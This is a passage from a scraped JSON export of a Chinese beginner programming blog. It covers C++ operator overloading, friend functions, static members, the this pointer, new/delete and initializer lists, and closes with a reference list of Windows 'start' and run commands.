&lt;&lt; endl; return cout;&#125;C::C(int ta, int tb)&#123; a = ta; b = tb;&#125;C::C()&#123;&#125;C::~C()&#123;&#125;int main(char *argv[], int argc)&#123; C a(1, 2),b(2,3); cout &lt;&lt; a &lt;&lt; b; return 0;&#125; 重载右移 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class C&#123;public: C(); C(int ta,int tb); ~C(); //友元重载左移&lt;&lt;运算符 friend ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another); //友元重载左移&gt;&gt;运算符 friend istream &amp; operator&gt;&gt;(istream &amp;cin ,C &amp; another);private: int a; int b;&#125;;//友元重载右移&gt;&gt;运算符istream &amp; operator&gt;&gt;(istream &amp; cin, C &amp; another)&#123; cin &gt;&gt; another.a &gt;&gt; another.b; return cin;&#125;//友元重载左移&lt;&lt;运算符ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another)&#123; cout &lt;&lt; another.a &lt;&lt; endl; cout &lt;&lt; another.b &lt;&lt; endl; cout &lt;&lt; \"==================\" &lt;&lt; endl; return cout;&#125;C::C(int ta, int tb)&#123; a = ta; b = tb;&#125;C::C()&#123;&#125;C::~C()&#123;&#125;int main(char *argv[], int argc)&#123; C a(1, 2),b(2,3); C c; cout &lt;&lt; a &lt;&lt; b; cin &gt;&gt; a &gt;&gt; c; cout &lt;&lt; a &lt;&lt; c; return 0;&#125; 只能用友元重载，如果用成员函数重载会出现顺序错误 123456789101112ostream &amp; operator&lt;&lt;(ostream &amp; cout)&#123; cout &lt;&lt; this-&gt;a &lt;&lt; endl; cout &lt;&lt; this-&gt;b &lt;&lt; endl; return cout;&#125;int main()&#123; C a; //用成员重载&lt;&lt;或&gt;&gt; 会出现对象在左边的情况,所以不建议用成员函数来重载&lt;&lt;和&gt;&gt;运算符 a &lt;&lt; cout; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"单目和双目运算符重载","slug":"cpp0033-单目和双目运算符重载","date":"2021-05-11T11:26:00.000Z","updated":"2021-12-28T18:36:35.162Z","comments":true,"path":"2021/05/11/cpp0033-单目和双目运算符重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0033-单目和双目运算符重载/","excerpt":"","text":"单目和双目运算符重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta, int tb); //A operator+(const A &amp; another); //A &amp; operator+=(const A &amp; another); friend A operator+(A &amp; a1, A &amp; a2); friend A&amp; operator+=(A &amp; a1, A &amp; a2); void print(); ~A();private: int a; int b;&#125;;void A::print() &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"=========================\" &lt;&lt; endl;&#125;//////重载双目操作符//A &amp; A::operator+=(const A &amp; another)//&#123;// a += another.a;// b += another.b;// return *this;//&#125;//A A::operator+(const A &amp; another)//&#123;// return A(a + another.a,b + another.b);//&#125;A::A(int ta, int tb)&#123; a = ta; b = tb;&#125;A::A()&#123; a = 0; b = 0;&#125;A::~A()&#123;&#125;//全局重载运算符函数A operator+(A &amp; a1,A &amp; a2) &#123; return A(a1.a + a2.a ,a1.b + a2.b);&#125;A &amp; operator+=(A &amp; a1, A &amp; a2) &#123; a1.a += a2.a; a1.b += a2.b; return a1;&#125;int main(char *argv[], int argc)&#123; A a1(1, 1), a2(2, 2); A a3 = a1 + a2; a3.print(); a3 += a1; a3.print(); return 0;&#125; 前和后重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta, int tb); //A operator+(const A &amp; another); //A &amp; operator+=(const A &amp; another); //前++ A &amp; operator++(); //后++ const A operator++(int); friend A operator+(A &amp; a1, A &amp; a2); friend A&amp; operator+=(A &amp; a1, A &amp; a2); ////前++ //friend A&amp; operator++(A &amp;a1); ////后++ //friend const A operator++(A &amp;a1, int); void print()const; ~A();private: int a; int b;&#125;;//全局友元重载++函数//后++//const A operator++(A &amp; a1, int)//&#123;// A temp(a1.a, a1.b);// a1.a++;// a1.b++;// return a1;//&#125;////前++//A &amp; operator++(A &amp; a1)//&#123;// ++a1.a;// ++a1.b;// return a1;//&#125;//成员重载++运算符函数//前++A &amp; A::operator++()&#123; ++a; ++b; return *this;&#125;//后++const A A::operator++(int)&#123; A temp(a, b); a++; b++; return temp;&#125;void A::print()const &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"=========================\" &lt;&lt; endl;&#125;//////重载双目操作符//A &amp; A::operator+=(const A &amp; another)//&#123;// a += another.a;// b += another.b;// return *this;//&#125;//A A::operator+(const A &amp; another)//&#123;// return A(a + another.a,b + another.b);//&#125;A::A(int ta, int tb)&#123; a = ta; b = tb;&#125;A::A()&#123; a = 0; b = 0;&#125;A::~A()&#123;&#125;//全局重载运算符函数A operator+(A &amp; a1,A &amp; a2) &#123; return A(a1.a + a2.a ,a1.b + a2.b);&#125;A &amp; operator+=(A &amp; a1, A &amp; a2) &#123; a1.a += a2.a; a1.b += a2.b; return a1;&#125;void test1() &#123; A a1(1, 1), a2(2, 2); A a3 = a1 + a2; a3.print(); a3 += a1; a3.print();&#125;void test2() &#123; A a1(1, 1), a2(2, 2); ++++a1; a1.print(); (a1++).print(); a1.print();&#125;int main(char *argv[], int argc)&#123; //test1(); test2(); return 0;&#125; 友元重载前和后函数的区别 1234567891011121314151617181920212223//前++friend A&amp; operator++(A &amp;a1);//后++friend const A operator++(A &amp;a1, int);//后++const A operator++(A &amp; a1, int)&#123; A temp(a1.a, a1.b); a1.a++; a1.b++; return a1;&#125;//前++A &amp; operator++(A &amp; a1)&#123; ++a1.a; ++a1.b; return a1;&#125; 类成员函数重载前和后函数的区别 123456789101112131415161718192021222324前++A &amp; operator++();后++const A operator++(int);//成员重载++运算符函数//前++A &amp; A::operator++()&#123; ++a; ++b; return *this;&#125;//后++const A A::operator++(int)&#123; A temp(a, b); a++; b++; return temp;&#125; 后++是不能连用的,所以返回的是一个常对象","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"操作符重载的规则","slug":"cpp0032-操作符重载的规则","date":"2021-05-11T10:49:30.000Z","updated":"2021-12-28T18:36:31.233Z","comments":true,"path":"2021/05/11/cpp0032-操作符重载的规则/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0032-操作符重载的规则/","excerpt":"","text":"操作符重载的规则 不能重载的运算符只有 4 个:","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"操作符重载的基本语法","slug":"cpp0031-操作符重载的基本语法","date":"2021-05-10T16:24:14.000Z","updated":"2021-12-28T18:36:27.319Z","comments":true,"path":"2021/05/11/cpp0031-操作符重载的基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0031-操作符重载的基本语法/","excerpt":"","text":"操作符重载的基本语法 所谓重载，就是重新赋予新的含义。函数重载就是对一个已有的函数赋 予新的含义，使之实现新功能，因此，一个函数名就可以用来代表不同功能的 函数，也就是”一名多用”。 运算符也可以重载。实际上，我们已经在不知不觉之中使用了运算符重 载。例如，大家都已习惯于用加法运算符”+”对整数、单精度数和双精度数进行 加法运算，如5+8，5.8+3.67等，其实计算机对整数、单精度数和双精度数的 加法操作过程是很不相同的，但由于C++已经对运算符”+”进行了重载，所以就能适用于int,float, double类型的运算。 又如”&lt;&lt;“是C的位运算中的位移运算符（左移），但在输出操作中又是与流对象cout配合使用的流插入运算符，”&gt;&gt;“也是位移运算符(右移），但在输入操作中又是与流对象cin配合使用的流提取运算符。这就是运算符重载(operator overloading)。C系统对”&lt;&lt;“和”&gt;&gt;“进行了重载，用户在不同的场合下 使用它们时，作用是不同的。对”&lt;&lt;“和”&gt;&gt;“的重载处理是放在头文件stream中的。因此，如果要在程序中用”&lt;&lt;“和”&gt;&gt;”作流插入运算符和流提取运算符，必须在本文件模块中包含头文件stream(当然还应当包括”using namespace std“)。 现在要讨论的问题是：用户能否根据自己的需要对C++已提供的运算符进行重载，赋予它们新的含义，使之一名多用. 运算符重载的本质是函数重载。 重载函数的一般格式如下: operator 运算符名称 在一起构成了新的函数名。比如 我们会说,operator+ 重载了运算符+。 友元重载 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta,int tb); ~A(); void print(); //友元重载(全局重载函数) friend const A &amp; operator+(const A &amp;ta1, const A &amp;ta2); int getA() &#123; return a; &#125; int getB() &#123; return b; &#125;private: int a; int b;&#125;;void A::print() &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl;&#125;A::A(int ta,int tb) &#123; a = ta; b = tb;&#125;A::A()&#123;&#125;A::~A()&#123;&#125;//友元重载(全局重载函数)const A &amp; operator+(const A &amp;ta1,const A &amp;ta2) &#123; return A(ta1.a + ta2.a,ta1.b + ta2.b);&#125;int main(char *argv[], int argc)&#123; A a1(1,2); A a2(3, 4); A a3 = a1 + a2; //operator+(a1,a2); a3.print(); return 0;&#125; 成员重载 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta, int tb); ~A(); void print(); //成员操作符重载函数 const A operator+(const A &amp; anotherA); int getA() &#123; return a; &#125; int getB() &#123; return b; &#125;private: int a; int b;&#125;;//成员操作符重载函数const A A::operator+(const A &amp; anotherA)&#123; return A(this-&gt;a + anotherA.a, this-&gt;b + anotherA.b);&#125;void A::print() &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl;&#125;A::A(int ta, int tb) &#123; a = ta; b = tb;&#125;A::A()&#123;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a1(1, 2); A a2(3, 4); A a3 = a1 + a2; //a3 = a1.operator+(a2); a3.print(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"友元类和友元的关系性质","slug":"cpp0030-友元类和友元的关系性质","date":"2021-05-10T15:59:59.000Z","updated":"2021-12-28T18:36:22.504Z","comments":true,"path":"2021/05/10/cpp0030-友元类和友元的关系性质/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0030-友元类和友元的关系性质/","excerpt":"","text":"友元类和友元的关系性质 友元类的所有成员函数都是另一个类的友元函数,都可以访问另一个类中 的隐藏信息(包括私有成员和保护成员)。 当希望一个类可以存取另一个类的私有成员时,可以将该类声明为另一类 的友元类。定义友元类的语句格式如下: 经过以上说明后,类 B 的所有成员函数都是类 A 的友元函数,能存取类 A的私有成员和保护成员。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); ~A(); //友元类,代表类B可以访问类A的私有成员和保护成员 friend class B;private: int a; int b;&#125;;class B&#123;public: B(); ~B(); void printCA(A &amp;a) &#123; cout &lt;&lt; a.a &lt;&lt; endl; cout &lt;&lt; a.b &lt;&lt; endl; &#125;private:&#125;;B::B()&#123;&#125;B::~B()&#123;&#125;A::A()&#123; a = 10; b = 20;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a1; B b1; b1.printCA(a1); return 0;&#125; 声明位置 友元声明以关键字 friend 开始,它只能出现在类定义中。因为友元不是授 权类的 成员,所以它不受其所在类的声明区域 public private 和 protected 的影 响。通常我们 选择把所有友元声明组织在一起并放在类头之后. 友元的利弊 友元不是类成员,但是它可以访问类中的私有成员。友元的作用在于提高 程序的运 行效率,但是,它破坏了类的封装性和隐藏性,使得非成员函数可以访问 类的私有成员。 不过,类的访问权限确实在某些应用场合显得有些呆板,从而容 忍了友元这一特别语法 现象。 注意事项 (1) 友元关系不能被继承。 (2) 友元关系是单向的,不具有交换性。若类 B 是类 A 的友元,类 A 不一定是类B 的友元,要看在类中是否有相应的声明。 (3) 友元关系不具有传递性。若类 B 是类 A 的友元,类 C 是 B 的友元,类 C 不一定 是类 A 的友元,同样要看类中是否有相应的声明。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"友元函数","slug":"cpp0029-友元函数","date":"2021-05-10T15:10:16.000Z","updated":"2021-12-28T18:36:18.933Z","comments":true,"path":"2021/05/10/cpp0029-友元函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0029-友元函数/","excerpt":"","text":"友元函数 采用类的机制后实现了数据的隐藏与封装,类的数据成员一般定义为私有成 员,成员函 数一般定义为公有的,依此提供类与外界间的通信接口。但是,有时需 要定义一些函数,这 些函数不是类的一部分,但又需要频繁地访问类的数据成员, 这时可以将这些函数定义为该 函数的友元函数。除了友元函数外,还有友元类, 两者统称为友元。友元的作用是提高了程 序的运行效率(即减少了类型检查和 安全性检查等都需要时间开销),但它破坏了类的封装 性和隐藏性,使得非成员函 数可以访问类的私有成员。 友元可以是一个函数,该函数被称为友元函数;友元也可以是一个类,该类被 称为友元 类。 友元函数是可以直接访问类的私有成员的非成员函数。它是定义在类外 的普通函 数,它不属于任何类,但需要在类的定义中加以声明,声明时只需在友元 的名称前加上 关键字 friend,其格式如下: 一个函数可以是多个类的友元函数,只需要在各个类中分别声明。 全局函数作友元函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;using namespace std;class Test&#123;public: Test(); ~Test(); friend int getA(Test &amp; t1); friend int getB(Test &amp; t1);private: int a; int b;&#125;;Test::Test()&#123; a = 10; b = 20;&#125;Test::~Test()&#123;&#125;//通过友元函数访问对象私有成员int getA(Test &amp; t1) &#123; return t1.a;&#125;//通过友元函数访问对象私有成员int getB(Test &amp; t1) &#123; return t1.b;&#125;int main(char *argv[], int argc)&#123; Test t1; cout &lt;&lt; getA(t1) &lt;&lt; endl; cout &lt;&lt; getB(t1) &lt;&lt; endl; return 0;&#125; 类成员函数作友元函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;//前向声明,是一种不完全型声明,即只需提供类名(无需提供类实现)即可。仅可⽤于声明指针和引用。class Student;class Teacher&#123;public: Teacher(); ~Teacher(); void print(Student &amp; s)const;private:&#125;;class Student&#123;public: Student(); ~Student(); //用Teacher类的成员函数做友元 friend void Teacher::print(Student &amp; s)const;private: char name[50]; int xueHao;&#125;;void Teacher::print(Student &amp; s) const&#123; cout &lt;&lt; s.name &lt;&lt; endl; cout &lt;&lt; s.xueHao &lt;&lt; endl;&#125;Teacher::Teacher()&#123;&#125;Teacher::~Teacher()&#123;&#125;Student::Student()&#123; strcpy(name,\"XiaoMing\"); xueHao = 10001;&#125;Student::~Student()&#123;&#125;int main(char *argv[], int argc)&#123; Student s; Teacher t; t.print(s); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"对象返回自身","slug":"cpp0028-对象返回自身","date":"2021-05-10T14:56:25.000Z","updated":"2021-12-28T18:36:14.115Z","comments":true,"path":"2021/05/10/cpp0028-对象返回自身/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0028-对象返回自身/","excerpt":"","text":"对象返回自身 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;using namespace std;class Test&#123;public: Test(); ~Test(); const Test &amp; print() const &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; c &lt;&lt; endl; cout &lt;&lt; \"====================\" &lt;&lt; endl; return *this; //返回自己本身 &#125;private: int a; int b; int c;&#125;;Test::Test()&#123; a = 10; b = 20; c = 30;&#125;Test::~Test()&#123;&#125;int main(char *argv[], int argc)&#123; Test t1; t1.print().print(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"this指针","slug":"cpp0027-this指针","date":"2021-05-10T14:22:10.000Z","updated":"2022-05-30T16:03:54.979Z","comments":true,"path":"2021/05/10/cpp0027-this指针/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0027-this指针/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;class Student&#123;public: Student(); ~Student(); Student(const char * name,int score); //在成员函数后面加上const代表不能修改成员变量 const char * getName()const; void print()const;private: char * name; int score; int xueHao; static int jXueHao;&#125;;int Student::jXueHao = 10000;//打印类成员void Student::print() const&#123; cout &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; score &lt;&lt; endl; cout &lt;&lt; xueHao &lt;&lt; endl;&#125;//返回nameconst char * Student::getName()const&#123; return this-&gt;name;&#125;Student::Student(const char * name, int score)&#123; int len = strlen(name) + 1; this-&gt;name = new char[len]; strcpy(this-&gt;name, name); this -&gt; score = score; xueHao = jXueHao + 1; jXueHao++;&#125;Student::Student()&#123; name = NULL; xueHao = jXueHao + 1; jXueHao++;&#125;Student::~Student()&#123; if (name != NULL) &#123; delete[] name; name = NULL; &#125;&#125;void test() &#123; Student s1(\"XiaoMing\", 100); s1.print(); cout &lt;&lt; s1.getName() &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"静态成员变量和静态成员函数","slug":"cpp0026-静态成员变量和静态成员函数","date":"2021-05-10T13:51:48.000Z","updated":"2021-12-28T18:36:07.637Z","comments":true,"path":"2021/05/10/cpp0026-静态成员变量和静态成员函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0026-静态成员变量和静态成员函数/","excerpt":"","text":"静态成员变量和静态成员函数 在 C++中,静态成员是属于整个类的而不是某个对象,静态成员变量只存储 一份供 所有对象共用。所以在所有对象中都可以共享它。使用静态成员变量实 现多个对象之间 的数据共享不会破坏隐藏的原则,保证了安全性还可以节省内 存。 类的静态成员,属于类,也属于对象,但终归属于类。 静态成员变量 12345678910111213141516171819202122232425262728293031323334353637#include&lt;iostream&gt;using namespace std;class Box&#123;public: Box(); ~Box(); static int height;private: int lenght; int width;&#125;;//只能在类外初始化int Box::height = 100;Box::Box()&#123;&#125;Box::~Box()&#123;&#125;int main(char *argv[], int argc)&#123; Box b; //访问方式 cout &lt;&lt; b.height &lt;&lt; endl;//用对象访问 cout &lt;&lt; Box::height &lt;&lt; endl;//用类名访问 return 0;&#125; 静态成员函数 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;using namespace std;class Box&#123;public: Box(); ~Box(); //静态成员函数 static int getHeight() &#123; return height; &#125; static int height;private: int lenght; int width;&#125;;//只能在类外初始化int Box::height = 100;Box::Box()&#123;&#125;Box::~Box()&#123;&#125;int main(char *argv[], int argc)&#123; Box b; //访问方式 cout &lt;&lt; b.height &lt;&lt; endl;//用对象访问 cout &lt;&lt; Box::height &lt;&lt; endl;//用类名访问 cout &lt;&lt; Box::getHeight() &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"new和delete操作符","slug":"cpp0025-new和delete操作符","date":"2021-05-10T12:08:40.000Z","updated":"2021-12-28T18:36:03.596Z","comments":true,"path":"2021/05/10/cpp0025-new和delete操作符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0025-new和delete操作符/","excerpt":"","text":"new和delete操作符 在软件开发过程中，常常需要动态地分配和撤销内存空间，例如对动态 链表中结点的插入与删除。在C语言中是利用库函数malloc和free来分配和撤 销内存空间的。C++提供了较简便而功能较强的运算符new和delete来取代 malloc和free函数。 new和delete是运算符，不是函数，因此执行效率高。 用new分配数组空间时不能指定初值。如果由于内存不足等原因而无法正 常分配空间，则new会返回一个空指针NULL，用户可以根据该指针的值判断分 配空间是否成功。 malloc不会调用类的构造函数,而new会调用类的构造函数 free不会调用类的析构函数，而delete会调用类的析构函数 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;iostream&gt;using namespace std;void test() &#123; //使用new开辟一个int类型变量空间 int * ip = new int; //使用new开辟一个int类型数组空间 int * arrayP = new int[10]; if (ip != NULL) &#123; *ip = 100; cout &lt;&lt; *ip &lt;&lt; endl; //释放ip空间 delete ip; ip = NULL; &#125; if (arrayP != NULL) &#123; for (int i = 0; i &lt; 10; i++) &#123; arrayP[i] = i + 1; cout &lt;&lt; arrayP[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //释放arrayP数组指针 delete[] arrayP; arrayP = NULL; &#125;&#125;int main(char *argv[], int argc)&#123; test(); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;class Student &#123;public: Student()&#123; name = NULL; cout &lt;&lt; \"Student()\" &lt;&lt; endl; &#125; Student(const char *tname,int txueHao,float tscore) &#123; cout &lt;&lt; \"Student(char *tname,int txueHao,float tscore)\" &lt;&lt; endl; const int len = strlen(tname) + 1; name = new char[len]; strcpy(name, tname); xueHao = txueHao; score = tscore; &#125; ~Student() &#123; cout &lt;&lt; \"~Student()\" &lt;&lt; endl; if (name != NULL) &#123; delete [] name; name = NULL; &#125; &#125;private: char * name; int xueHao; float score;&#125;;void test1() &#123; Student *s1 = new Student();//触发无参构造 Student *s2 = new Student(\"XiaoMing\", 123, 100.0f);//触发有参构造 int *ip = new int(10);//new一个int类型存储空间并赋于10; delete s1;//触发析构函数 delete s2;//触发析构函数 delete ip;&#125;int main(char *argv[], int argc)&#123; test1(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"构造函数初始化列表","slug":"cpp0024构造函数初始化列表","date":"2021-05-07T19:16:19.000Z","updated":"2021-12-28T18:35:58.076Z","comments":true,"path":"2021/05/08/cpp0024构造函数初始化列表/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/08/cpp0024构造函数初始化列表/","excerpt":"","text":"构造函数初始化列表 如果我们有一个类成员，它本身是一个类或者是一个结构，而且这个成员它只有一个带参数的构造函数，没有默认构造函数。这时要对这个类成员进行初始化，就必须调用这个类成员的带参数的构造函数，如果没有初始化列表，那么他将无法完成第一步，就会报错。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class A&#123;public: A(int a) &#123; m_a = a; &#125;private: int m_a;&#125;;class B&#123;public: B(int b) &#123; m_b = b; &#125;private: int m_b; A obja; //当A的对象是B类的⼀一个成员的时候，在初始化B对象的时候， //⽆无法给B分配空间，因为⽆无法初始化A类对象&#125;; int main(void)&#123; A obja(10); B objb(20);//error, return 0;&#125; 语法: 构造函数名(参数1,...,参数n):本类成员名1(参数1),...,本类成员名n(参数n) 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class A&#123;public: A(int a) &#123; m_a = a; &#125;private: int m_a;&#125;;class B&#123;public: //先初始化m_b,然后再初始化obja,初始化的顺序要看类的成员声明顺序,先声明谁就先初始化谁 B(int b, A &amp;tempA):m_b(b),obja(tempA) &#123; &#125; B(int b) :m_b(b), obja(100)//调用obja的有参构造函数 &#123; &#125;private: int m_b; A obja;&#125;;int main(void)&#123; A obja(10); B objb(20,obja); B objb2(20); return 0;&#125; 当类成员中含有一个const对象时，或者是一个引用时，他们也必须要通过成员初始化列表进行初始化，因为这两种对象要在声明后马上初始化，而在构造函数中，做的是对他们的赋值，这样是不被允许的。 初始化列表中的初始化顺序,与声明顺序有关,与前后赋值顺序无关。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"starta-cmd命令","slug":"win001starta-cmd命令","date":"2021-05-06T10:04:05.000Z","updated":"2021-05-06T10:10:08.384Z","comments":true,"path":"2021/05/06/win001starta-cmd命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/06/win001starta-cmd命令/","excerpt":"","text":"starta-cmd命令 Start 启动单独的“命令提示符”窗口来运行指定程序或命令。如果在没有参数的情况下使用，start 将打开第二个命令提示符窗口。 语法 start [&quot;title&quot;] [/dPath] [/i] [/min] [/max] [{/separate | /shared}] [{/low | /normal | /high | /realtime | /abovenormal | belownormal}] [/wait] [/b] [FileName] [parameters] 参数 “title” 指定在“命令提示符”窗口标题栏中显示的标题。 /dpatch 指定启动目录。 /i 将 Cmd.exe 启动环境传送到新的“命令提示符”窗口。 /min 启动新的最小化窗口。 /max 启动新的最大化窗口。 /separate 在单独的内存空间启动 16 位程序。 /shared 在共享的内存空间启动 16 位程序。 /low 以空闲优先级启动应用程序。 /normal 以一般优先级启动应用程序。 /high 以高优先级启动应用程序。 /realtime 以实时优先级启动应用程序。 /abovenormal 以超出常规优先级的方式启动应用程序。 /belownormal 以低出常规优先级的方式启动应用程序。 /wait 启动应用程序，并等待其结束。 /b 启动应用程序时不必打开新的“命令提示符”窗口。除非应用程序启用 CTRL+C，否则将忽略 CTRL+C 操作。使用 CTRL+BREAK 中断应用程序。 非执行文件只要将文件名作为命令键入，即可通过其文件关联运行该文件。有关使用 assoc 和 ftype 在命令脚本中创建这些关联的详细信息，请参阅“”。 在运行的命令的第一个标记为“CMD”字符串但不包括扩展名或路径限定符时，“CMD”将被 COMSPEC 变量的值取代。这样可以防止用户从当前目录选取 cmd。 当您运行 32 位图形用户界面 (GUI) 应用程序时，cmd 不会在返回到命令提示符之前等待应用程序退出。如果从命令脚本运行应用程序，则不会发生这种新情况。在运行的命令中第一个符号不包括扩展名的情况下，Cmd.exe 使用 PATHEXT 环境变量的值确定要查找的扩展名以及查找顺序。PATHEXT 变量的默认值为：COM;.EXE;.BAT;.CMD（语法与 PATH 变量相同，使用分号分开不同元素）。当您搜索可执行文件且在任何扩展名上都没有匹配项时，start 将搜索目录名。 具体例子： 说明：如果你所在程序的路径中带有空格，那么必须用“”把路径括起来，否则系统会提示找不到XX文件，另外，在运行某些程序时，需在路径的前面加一对空白的“”，表示创建一个空白的窗口，它指向的程序是XXXXXXXX。还有就是别忘了空格。 当我想运行位于“D:/draw/”的“photoshop.exe”使，应该使用以下命令： start “”“D:/draw/photoshop.exe” 表示以常规窗口运行程序 如果想让程序以最大化窗口运行，则使用以下命令： start /max“”“D:/draw/photoshop.exe” 表示以最大化窗口运行程序 最小化这是这样： start /min “” “D:/draw/photoshop.exe” 表示以最小化窗口运行程序 等待某个程序允许完毕，也就是窗口关闭后，再打开下一个程序这可以这样： start /w “” “D:/draw/photoshop.exe” start “” cmd.exe CMD cmd /c dir 是执行完dir命令后关闭命令窗口。 cmd /k dir 是执行完dir命令后不关闭命令窗口。 cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。 cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。 gpedit.msc-----组策略 sndrec32-------录音机 Nslookup-------IP地址侦测器 explorer-------打开资源管理器 logoff---------注销命令 tsshutdn-------60秒倒计时关机命令 lusrmgr.msc----本机用户和组 services.msc—本地服务设置 oobe/msoobe /a----检查XP是否激活 notepad--------打开记事本 cleanmgr-------垃圾整理 net start messenger----开始信使服务 compmgmt.msc—计算机管理 net stop messenger-----停止信使服务 conf-----------启动netmeeting dvdplay--------DVD播放器 charmap--------启动字符映射表 diskmgmt.msc—磁盘管理实用程序 calc-----------启动计算器 dfrg.msc-------磁盘碎片整理程序 chkdsk.exe-----Chkdsk磁盘检查 devmgmt.msc— 设备管理器 regsvr32 /u *.dll----停止dll文件运行 drwtsn32------ 系统医生 rononce -p ----15秒关机 dxdiag---------检查DirectX信息 regedt32-------注册表编辑器 Msconfig.exe—系统配置实用程序 rsop.msc-------组策略结果集 mem.exe--------显示内存使用情况 regedit.exe----注册表 winchat--------XP自带局域网聊天 progman--------程序管理器 winmsd---------系统信息 perfmon.msc----计算机性能监测程序 winver---------检查Windows版本 sfc /scannow-----扫描错误并复原 taskmgr-----任务管理器（2000／xp／2003 winver---------检查Windows版本 wmimgmt.msc----打开windows管理体系结构(WMI) wupdmgr--------windows更新程序 wscript--------windows脚本宿主设置 write----------写字板 winmsd---------系统信息 wiaacmgr-------扫描仪和照相机向导 winchat--------XP自带局域网聊天 mem.exe--------显示内存使用情况 Msconfig.exe—系统配置实用程序 mplayer2-------简易widnows media player mspaint--------画图板 mstsc----------远程桌面连接 mplayer2-------媒体播放机 magnify--------放大镜实用程序 mmc------------打开控制台 mobsync--------同步命令 dxdiag---------检查DirectX信息 drwtsn32------ 系统医生 devmgmt.msc— 设备管理器 dfrg.msc-------磁盘碎片整理程序 